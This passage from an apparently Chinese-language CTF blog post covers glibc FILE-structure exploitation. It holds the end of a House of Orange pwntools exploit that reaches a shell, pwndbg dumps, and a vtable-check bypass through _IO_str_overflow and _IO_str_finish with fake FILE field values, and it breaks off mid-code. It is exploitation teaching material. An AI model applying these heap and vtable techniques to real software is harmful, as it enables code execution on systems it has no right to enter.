</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'b'</span><span class="o">*</span><span class="mh">0x18</span> <span class="c1"># padding to vtable-&gt;_overflow
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">p</span><span class="p">)</span>

<span class="c1"># debug("b *_IO_flush_all_lockp")
</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>


<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
 <span class="o">[</span>DEBUG] Received 0x199 bytes:
    <span class="s1">'Finish\n'</span>
    <span class="s1">'+++++++++++++++++++++++++++++++++++++\n'</span>
    <span class="s1">'@          House of Orange          @\n'</span>
    <span class="s1">'+++++++++++++++++++++++++++++++++++++\n'</span>
    <span class="s1">' 1. Build the house                  \n'</span>
    <span class="s1">' 2. See the house                    \n'</span>
    <span class="s1">' 3. Upgrade the house                \n'</span>
    <span class="s1">' 4. Give up                          \n'</span>
    <span class="s1">'+++++++++++++++++++++++++++++++++++++\n'</span>
    <span class="s2">"Your choice : *** Error in </span><span class="sb">`</span>./houseoforange<span class="s1">': malloc(): memory corruption: 0x00007ffff7dd2520 ***\n"
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house
 2. See the house
 3. Upgrade the house
 4. Give up
+++++++++++++++++++++++++++++++++++++
Your choice : *** Error in `./houseoforange'</span>: malloc<span class="o">()</span>: memory corruption: 0x00007ffff7dd2520 <span class="k">***</span>
<span class="nv">$ </span><span class="nb">ls</span>
<span class="o">[</span>DEBUG] Sent 0x3 bytes:
    <span class="s1">'ls\n'</span>
<span class="o">[</span>DEBUG] Received 0x24 bytes:
    <span class="s1">'go.py  houseoforange  libc.so.63751\n'</span>
go.py  houseoforange  libc.so.63751
<span class="err">$</span>
</pre></table></code></div></div><h2 id="0x05-vtable-check-bypass">0x05 vtable check bypass<a href="#0x05-vtable-check-bypass" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>关于glibc2.24下新增的<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=commitdiff;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51">vtable check</a>的介绍，如下资料写的很详细了，我就不搬过来了</p><ul><li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with FILE Structure - Yet Another Binary Exploit Technique</a><li>https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</ul><p>所有的<code class="language-plaintext highlighter-rouge">libio vtables</code>都被放进了只读的<code class="language-plaintext highlighter-rouge">__libc_IO_vtable</code>段，如果超过了边界，则调用<code class="language-plaintext highlighter-rouge">_IO_vtable_check</code>做进一步检查</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="n">_IO_vtable_check</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">attribute_hidden</span><span class="p">;</span>

<span class="cm">/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span>
<span class="nf">IO_validate_vtable</span> <span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */</span>
  <span class="kt">uintptr_t</span> <span class="n">section_length</span> <span class="o">=</span> <span class="n">__stop___libc_IO_vtables</span> <span class="o">-</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">vtable</span><span class="p">;</span>
  <span class="kt">uintptr_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">section_length</span><span class="p">))</span>
    <span class="cm">/* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */</span>
    <span class="n">_IO_vtable_check</span> <span class="p">();</span>
  <span class="k">return</span> <span class="n">vtable</span><span class="p">;</span>
<span class="p">}</span>


<span class="cm">/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span>
<span class="nf">IO_validate_vtable</span> <span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */</span>
  <span class="kt">uintptr_t</span> <span class="n">section_length</span> <span class="o">=</span> <span class="n">__stop___libc_IO_vtables</span> <span class="o">-</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">vtable</span><span class="p">;</span>
  <span class="kt">uintptr_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">section_length</span><span class="p">))</span>
    <span class="cm">/* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */</span>
    <span class="n">_IO_vtable_check</span> <span class="p">();</span>
  <span class="k">return</span> <span class="n">vtable</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>新增了这个check之后，我们就不能把vtable写在heap段了。</p><p>于是为了让FSOP还能继续玩，就可以有两种方法：</p><ul><li>第一种方法：不和vtable玩了，通过将stdin/stdout这些标准IO的file structure纂改成fread/fwrite，从而实现任意地址读写。<ul><li><a href="https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">构造方法见3.4小节</a><li>本章节不重点将这个的构造方法了</ul><li>第二种方法：当然是想办法bypass掉vtable的check</ul><h3 id="思路">思路<a href="#思路" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>不能写在heap段，bypass的方法也很简单，就复用glibc里的vtable。bypass的核心思想在第三节已经写过了：</p><blockquote><p><strong>同时，很重要的一点是</strong></p><p>vtable是没有做对齐检查的，这是什么意思呢？</p><p><code class="language-plaintext highlighter-rouge">FILE-&gt;vtable</code>指向的应该是一个<code class="language-plaintext highlighter-rouge">_IO_jump_t</code>结构体类型的<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>变量，在取<code class="language-plaintext highlighter-rouge">fp-&gt;vtable</code>值的时候不会去检查是不是指向了结构体的开头，而是直接拿到vtable地址，然后在该地址上直接加上0x18，就得到目标函数的地址了。</p><p>认清楚这一点对于bypass glibc2.24中新增的vtable check至关重要。</p></blockquote><p>所以vtable check只检查了我们不能把vtable指向一些乱七八糟的地方，那么把它指向合法vtable的前后是没问题的，然后使得<code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code>函数中<code class="language-plaintext highlighter-rouge">_IO_OVERFLOW (fp, EOF) == EOF</code>这行代码可以call到我们指定的函数</p><p>例如<a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">这篇文档</a>提出的通过<code class="language-plaintext highlighter-rouge">_IO_str_overflow</code>函数来bypass，这个函数其实就在<code class="language-plaintext highlighter-rouge">_IO_file_overflow</code>的后面：</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>pwndbg&gt; p &amp;_IO_file_jumps
<span class="nv">$3</span> <span class="o">=</span> <span class="o">(</span>const struct _IO_jump_t <span class="k">*</span><span class="o">)</span> 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;
pwndbg&gt; tele 0x7ffff7dd06e0
00:0000│  0x7ffff7dd06e0 <span class="o">(</span>_IO_file_jumps<span class="o">)</span> ◂— 0x0
01:0008│  0x7ffff7dd06e8 <span class="o">(</span>_IO_file_jumps+8<span class="o">)</span> ◂— 0x0
02:0010│  0x7ffff7dd06f0 <span class="o">(</span>_IO_file_jumps+16<span class="o">)</span> —▸ 0x7ffff7a869d0 <span class="o">(</span>_IO_file_finish<span class="o">)</span> ◂— push   rbx  &lt;<span class="o">====</span> 正常流程下_IO_flush_all_lockp中会调用这个函数
03:0018│  0x7ffff7dd06f8 <span class="o">(</span>_IO_file_jumps+24<span class="o">)</span> —▸ 0x7ffff7a87740 <span class="o">(</span>_IO_file_overflow<span class="o">)</span> ◂— mov    ecx, dword ptr <span class="o">[</span>rdi]
04:0020│  0x7ffff7dd0700 <span class="o">(</span>_IO_file_jumps+32<span class="o">)</span> —▸ 0x7ffff7a874b0 <span class="o">(</span>_IO_file_underflow<span class="o">)</span> ◂— mov    eax, dword ptr <span class="o">[</span>rdi]
...
...
...
pwndbg&gt;
18:00c0│  0x7ffff7dd07a0 <span class="o">(</span>_IO_str_jumps<span class="o">)</span> ◂— 0x0    &lt;<span class="o">===</span> 把vtable指到这里来
19:00c8│  0x7ffff7dd07a8 <span class="o">(</span>_IO_str_jumps+8<span class="o">)</span> ◂— 0x0
1a:00d0│  0x7ffff7dd07b0 <span class="o">(</span>_IO_str_jumps+16<span class="o">)</span> —▸ 0x7ffff7a89fb0 <span class="o">(</span>_IO_str_finish<span class="o">)</span> ◂— push   rbx
1b:00d8│  0x7ffff7dd07b8 <span class="o">(</span>_IO_str_jumps+24<span class="o">)</span> —▸ 0x7ffff7a89c90 <span class="o">(</span>_IO_str_overflow<span class="o">)</span> ◂— mov    ecx, dword ptr <span class="o">[</span>rdi]  &lt;<span class="o">===</span> 可以call这个函数了，0x18的偏移在这里
1c:00e0│  0x7ffff7dd07c0 <span class="o">(</span>_IO_str_jumps+32<span class="o">)</span> —▸ 0x7ffff7a89c30 <span class="o">(</span>_IO_str_underflow<span class="o">)</span> ◂— mov    rax, qword ptr <span class="o">[</span>rdi + 0x28]
</pre></table></code></div></div><p>那么为什么<code class="language-plaintext highlighter-rouge">_IO_file_overflow</code>函数不能用于控制程序流，而<code class="language-plaintext highlighter-rouge">_IO_str_overflow</code>就可以呢，其实本质是看函数内是否有相对地址调用，也就是看汇编代码的call指令</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>pwndbg&gt; disassemble _IO_file_overflow
Dump of assembler code <span class="k">for function </span>_IO_new_file_overflow:
   0x00007ffff7a87740 &lt;+0&gt;:     mov    ecx,DWORD PTR <span class="o">[</span>rdi]
   0x00007ffff7a87742 &lt;+2&gt;:     <span class="nb">test   </span>cl,0x8
   0x00007ffff7a87745 &lt;+5&gt;:     jne    0x7ffff7a878e0 &lt;_IO_new_file_overflow+416&gt;
   ...
   0x00007ffff7a87826 &lt;+230&gt;:   call   0x7ffff7a873a0 &lt;_IO_new_do_write&gt;
   ...
   0x00007ffff7a8784a &lt;+266&gt;:   call   0x7ffff7a881f0 &lt;__GI__IO_free_backup_area&gt;
   ...
   0x00007ffff7a8789f &lt;+351&gt;:   call   0x7ffff7a816d0 &lt;__GI__IO_wdo_write&gt;
   ...
   0x00007ffff7a87903 &lt;+451&gt;:   call   0x7ffff7a88570 &lt;__GI__IO_doallocbuf&gt;
   ...
   0x00007ffff7a87926 &lt;+486&gt;:   call   0x7ffff7a873a0 &lt;_IO_new_do_write&gt;
</pre></table></code></div></div><p>可以看到<code class="language-plaintext highlighter-rouge">_IO_file_overflow</code>函数内都是绝对地址调用，不管怎么控制程序流，都是固定call这些函数。</p><p>而<code class="language-plaintext highlighter-rouge">_IO_str_finish</code>函数就不一样了</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>pwndbg&gt; disassemble _IO_str_overflow
Dump of assembler code <span class="k">for function </span>__GI__IO_str_overflow:
   0x00007ffff7a89c90 &lt;+0&gt;:     mov    ecx,DWORD PTR <span class="o">[</span>rdi]
   0x00007ffff7a89c92 &lt;+2&gt;:     <span class="nb">test   </span>cl,0x8
   0x00007ffff7a89c95 &lt;+5&gt;:     je     0x7ffff7a89ca8 &lt;__GI__IO_str_overflow+24&gt;
   ...
   
   0x00007ffff7a89cdf &lt;+79&gt;:    mov    rbx,rdi
   ...
   0x00007ffff7a89d0e &lt;+126&gt;:   mov    rdi,r14  &lt;<span class="o">===</span> rdi可控
   0x00007ffff7a89d11 &lt;+129&gt;:   call   QWORD PTR <span class="o">[</span>rbx+0xe0] &lt;<span class="o">===</span> 相对地址调用
   ...
   0x00007ffff7a89d31 &lt;+161&gt;:   call   0x7ffff7aa14f0 &lt;__memcpy_sse2&gt;
   ...
   0x00007ffff7a89d39 &lt;+169&gt;:   call   QWORD PTR <span class="o">[</span>rbx+0xe8]
</pre></table></code></div></div><p>可以看到是存在相对地址调用的：<code class="language-plaintext highlighter-rouge">call QWORD PTR [rbx+0xe0]</code>，rbx来源：<code class="language-plaintext highlighter-rouge">mov rbx,rdi</code> , 而<code class="language-plaintext highlighter-rouge">rdi = fp</code>，所以要call的函数就在我们伪造的file structure的偏移0xe0处。在0xe0处填上<code class="language-plaintext highlighter-rouge">system</code>，就能call到system了.</p><p>我们知道vtable的偏移是0xd8=0xe0-0x8，所以就是在vtable下填上system即可。</p><p>同时system的参数也就是rdi是可以在函数内部控制的，<code class="language-plaintext highlighter-rouge">mov rdi,r14 &lt;=== rdi可控</code></p><p>具体见<code class="language-plaintext highlighter-rouge">_IO_str_overflow</code>源码，或者<a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">原作者解析</a>。我就不展开讲了</p><p>结论就是：</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>_flags = 0
_IO_write_base = 0
_IO_write_ptr = 0x7fffffffffffffff
_IO_buf_base = 0
_IO_buf_end = (bin_sh_addr - 100)/2
</pre></table></code></div></div><blockquote><p>哦对了，需要提一醒的是<code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>这个值还是设置大一点好</p><p>原作者提到<em>“flush_only is 0, so we want pos &gt;= _IO_blen(fp). This can be achieved by setting _IO_write_ptr = (x - 100)/2 and _IO_write_base = 0.”</em></p><p>对应代码就是：</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">flush_only</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">;</span>
<span class="n">pos</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">_IO_size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">+</span> <span class="n">flush_only</span><span class="p">)</span>
</pre></table></code></div></div><p>但是实际上flush_only 这值啊，不一定是0，我试了下有可能是-1</p><p>虽说这里运算是<code class="language-plaintext highlighter-rouge">(_IO_size_t) (_IO_blen (fp) + flush_only)) </code>加上一个-1，想当然这值相比于flush_only是0时会变小，但是按照补码0xffffffff去计算，然后再符号转换一下，还真不一定，我就踩过坑 还是_IO_write_ptr设置的大一点 比较保险</p><p>设置成0x7fffffffffffffff稳稳当当</p></blockquote><p><strong>一图胜千言，和原先相比只有vtable指向变了，以及file structure内除了构造FSOP的利用条件外，还需要构造控制<code class="language-plaintext highlighter-rouge">_IO_str_overflow</code>执行流的条件</strong></p><p><img data-src="/assets/img/2022/file_structure-vtable bypass.drawio.svg" alt="file_structure-vtable bypass.drawio" data-proofer-ignore></p><h3 id="举一反三">举一反三<a href="#举一反三" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>按照这个思路，网上<a href="https://tradahacking.vn/hitcon-2017-ghost-in-the-heap-writeup-ee6384cd0b7">很多人</a>提出的bypass技巧都迎刃而解了，甚至可以想到更多的function，只需要寻找满足以下两点：</p><ul><li>function内存在相对地址调用<li>rdi可控</ul><p>就可以控制程序执行流，从而执行<code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>了</p><p>我们找<code class="language-plaintext highlighter-rouge">libio_vtable</code>内的struct</p><p><img data-src="/assets/img/2022/image-20221216164529247.png" alt="image-20221216164529247" data-proofer-ignore></p><p>一搜一堆。</p><ul><li><code class="language-plaintext highlighter-rouge">_IO_str_finish</code></ul><p>就在<code class="language-plaintext highlighter-rouge">_IO_str_overflow</code>上面</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>pwndbg&gt; disassemble _IO_str_finish
Dump of assembler code <span class="k">for function </span>_IO_str_finish:
   0x00007ffff7a89fb0 &lt;+0&gt;:     push   rbx
   0x00007ffff7a89fb1 &lt;+1&gt;:     mov    rbx,rdi
   0x00007ffff7a89fb4 &lt;+4&gt;:     mov    rdi,QWORD PTR <span class="o">[</span>rdi+0x38] &lt;<span class="o">===</span> rdi可控
   0x00007ffff7a89fb8 &lt;+8&gt;:     <span class="nb">test   </span>rdi,rdi
   0x00007ffff7a89fbb &lt;+11&gt;:    je     0x7ffff7a89fc8 &lt;_IO_str_finish+24&gt;
   0x00007ffff7a89fbd &lt;+13&gt;:    <span class="nb">test   </span>BYTE PTR <span class="o">[</span>rbx],0x1
   0x00007ffff7a89fc0 &lt;+16&gt;:    jne    0x7ffff7a89fc8 &lt;_IO_str_finish+24&gt;
   0x00007ffff7a89fc2 &lt;+18&gt;:    call   QWORD PTR <span class="o">[</span>rbx+0xe8]   &lt;<span class="o">===</span> 相对地址调用
   0x00007ffff7a89fc8 &lt;+24&gt;:    mov    QWORD PTR <span class="o">[</span>rbx+0x38],0x0
   0x00007ffff7a89fd0 &lt;+32&gt;:    mov    rdi,rbx
   0x00007ffff7a89fd3 &lt;+35&gt;:    xor    esi,esi
   0x00007ffff7a89fd5 &lt;+37&gt;:    pop    rbx
   0x00007ffff7a89fd6 &lt;+38&gt;:    jmp    0x7ffff7a88c20 &lt;__GI__IO_default_finish&gt;
</pre></table></code></div></div><p>源码：</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>void
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))
    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  &lt;=== 就这行
  fp-&gt;_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">_IO_wstr_finish</code></ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>pwndbg&gt; tele 0x7ffff7dcbc60
00:0000│  0x7ffff7dcbc60 <span class="o">(</span>_IO_wstr_jumps<span class="o">)</span> ◂— 0x0
01:0008│  0x7ffff7dcbc68 <span class="o">(</span>_IO_wstr_jumps+8<span class="o">)</span> ◂— 0x0
02:0010│  0x7ffff7dcbc70 <span class="o">(</span>_IO_wstr_jumps+16<span class="o">)</span> —▸ 0x7ffff7a71800 <span class="o">(</span>_IO_wstr_finish<span class="o">)</span> ◂— push   rbx
03:0018│  0x7ffff7dcbc78 <span class="o">(</span>_IO_wstr_jumps+24<span class="o">)</span> —▸ 0x7ffff7a713e0 <span class="o">(</span>_IO_wstr_overflow<span class="o">)</span> ◂— mov    edx, dword ptr <span class="o">[</span>rdi]

pwndbg&gt; disassemble _IO_wstr_finish
Dump of assembler code <span class="k">for function </span>_IO_wstr_finish:
   0x00007ffff7a80260 &lt;+0&gt;:     push   rbx
   0x00007ffff7a80261 &lt;+1&gt;:     mov    rax,QWORD PTR <span class="o">[</span>rdi+0xa0]
   0x00007ffff7a80268 &lt;+8&gt;:     mov    rbx,rdi
   0x00007ffff7a8026b &lt;+11&gt;:    mov    rdi,QWORD PTR <span class="o">[</span>rax+0x30] &lt;<span class="o">===</span> rdi可控
   0x00007ffff7a8026f &lt;+15&gt;:    <span class="nb">test   </span>rdi,rdi
   0x00007ffff7a80272 &lt;+18&gt;:    je     0x7ffff7a80287 &lt;_IO_wstr_finish+39&gt;
   0x00007ffff7a80274 &lt;+20&gt;:    <span class="nb">test   </span>BYTE PTR <span class="o">[</span>rbx+0x74],0x8
   0x00007ffff7a80278 &lt;+24&gt;:    jne    0x7ffff7a80287 &lt;_IO_wstr_finish+39&gt;
   0x00007ffff7a8027a &lt;+26&gt;:    call   QWORD PTR <span class="o">[</span>rbx+0xe8]   &lt;<span class="o">===</span> 相对地址调用
   0x00007ffff7a80280 &lt;+32&gt;:    mov    rax,QWORD PTR <span class="o">[</span>rbx+0xa0]
   0x00007ffff7a80287 &lt;+39&gt;:    mov    QWORD PTR <span class="o">[</span>rax+0x30],0x0
   0x00007ffff7a8028f &lt;+47&gt;:    mov    rdi,rbx
   0x00007ffff7a80292 &lt;+50&gt;:    xor    esi,esi
   0x00007ffff7a80294 &lt;+52&gt;:    pop    rbx
   0x00007ffff7a80295 &lt;+53&gt;:    jmp    0x7ffff7a7eef0 &lt;__GI__IO_wdefault_finish&gt;
</pre></table></code></div></div><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="kt">void</span>
<span class="nf">_IO_wstr_finish</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dummy</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">&amp;</span> <span class="n">_IO_FLAGS2_USER_WBUF</span><span class="p">))</span>
    <span class="p">(((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_free_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>  <span class="o">&lt;===</span> <span class="err">就这行</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="n">_IO_wdefault_finish</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">_IO_wstr_overflow</code></ul><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="n">_IO_wint_t</span>
<span class="nf">_IO_wstr_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="n">_IO_wint_t</span> <span class="n">c</span><span class="p">)</span>
<span class="p">{</span>

    <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">old_buf</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">old_buf</span><span class="p">)</span>
    <span class="p">{</span>
          <span class="n">__wmemcpy</span> <span class="p">(</span><span class="n">new_buf</span><span class="p">,</span> <span class="n">old_buf</span><span class="p">,</span> <span class="n">old_wblen</span><span class="p">);</span>
          <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_free_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">old_buf</span><span class="p">);</span>   <span class="o">&lt;===</span> <span class="err">就这行</span>
          <span class="cm">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span>
          <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="p">}</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">_IO_wfile_sync</code></ul><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kt">wint_t</span>
